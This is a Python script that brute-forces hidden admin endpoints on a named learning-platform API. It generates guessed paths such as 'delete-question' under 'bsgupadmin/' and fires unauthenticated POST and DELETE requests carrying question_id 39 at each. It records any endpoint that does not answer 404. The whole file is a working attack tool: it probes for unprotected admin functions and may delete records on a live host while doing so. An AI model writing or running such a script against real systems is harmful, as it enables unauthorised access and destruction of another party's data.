import urllib.request
import urllib.error
import json

base_url = "https://api.bsguplms.in"

verbs = ["delete", "remove", "destroy", "drop", "clear", "cancel"]
nouns = [
    "question", "questions", "quiz-question", "quiz-questions",
    "quizquestion", "quizquestions", "quiz_question", "quiz_questions"
]
separators = ["-", "_", ""]

candidates = []
for verb in verbs:
    for noun in nouns:
        for sep in separators:
            # e.g., delete-question, delete_question, deletequestion
            candidates.append(f"bsgupadmin/{verb}{sep}{noun}/")
            candidates.append(f"bsgupadmin/{verb}{sep}{noun}")
            # e.g., question-delete, question_delete, questiondelete
            candidates.append(f"bsgupadmin/{noun}{sep}{verb}/")
            candidates.append(f"bsgupadmin/{noun}{sep}{verb}")

# De-duplicate
candidates = list(set(candidates))

print(f"Total candidates to test: {len(candidates)}")

methods = ["POST", "DELETE"]

found = []

for idx, path in enumerate(candidates):
    for method in methods:
        url = f"{base_url}/{path}"
        req = urllib.request.Request(url, method=method)
        req.add_header("Content-Type", "application/json")
        try:
            body = json.dumps({"question_id": 39, "id": 39}).encode("utf-8") if method == "POST" else None
            with urllib.request.urlopen(req, data=body, timeout=2) as response:
                print(f"FOUND: {method} {url} -> {response.status}")
                found.append((method, url, response.status))
        except urllib.error.HTTPError as e:
            if e.code != 404:
                print(f"FOUND: {method} {url} -> {e.code}")
                found.append((method, url, e.code))
        except Exception as e:
            pass

print("Done brute-forcing.")
print("Found endpoints:", found)
